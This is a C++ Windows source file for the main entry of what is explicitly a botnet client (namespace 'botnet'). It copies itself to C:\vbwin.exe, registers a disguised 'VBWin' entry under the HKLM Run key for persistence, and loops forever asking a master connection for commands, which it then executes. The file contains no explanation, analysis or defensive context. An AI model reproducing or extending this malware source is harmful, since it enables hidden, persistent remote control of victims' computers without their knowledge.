#if defined(UNICODE) && !defined(_UNICODE)
    #define _UNICODE
#elif defined(_UNICODE) && !defined(UNICODE)
    #define UNICODE
#endif

#include <tchar.h>
#include <windows.h>

#include <iostream>
#include "http_client.h"
#include "http_request.h"
#include "parser.h"
#include "utils.h"
#include "define.h"
#include "master_conn.h"


DWORD WINAPI ThreadFunction(LPVOID lpParam) {
    typedef botnet::parser parser;
    typedef botnet::master_conn master_conn;
    parser *pcmd;
    master_conn *conn = new master_conn();

    for (;;) {

        std::vector<std::string> arr = conn->ask_for_cmd();

        pcmd = new parser(arr);
        pcmd->execute();
        delete pcmd;

        Sleep(10000);
    }
    return 0;
}

void boot() {
    std::string regstr;
    regstr = botnet::GetRegistry("VBWin");
    char appreg[] = "C:\\vbwin.exe";
    if (regstr.find("vbwin") == std::string::npos) {
        botnet::SetKeyData(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                           REG_SZ, "VBWin", (LPBYTE) appreg, strlen(appreg));

        botnet::copy_it_self("C:", "vbwin.exe");
    }

}

int WINAPI WinMain (HINSTANCE hThisInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR lpszArgument,
                     int nCmdShow)
{
    HANDLE  hThreadArray;
    DWORD   dwThread;

    boot();

    hThreadArray = CreateThread(NULL, 0, ThreadFunction, NULL, 0, &dwThread);

    WaitForSingleObject(hThreadArray, INFINITE);

    return 0;
}
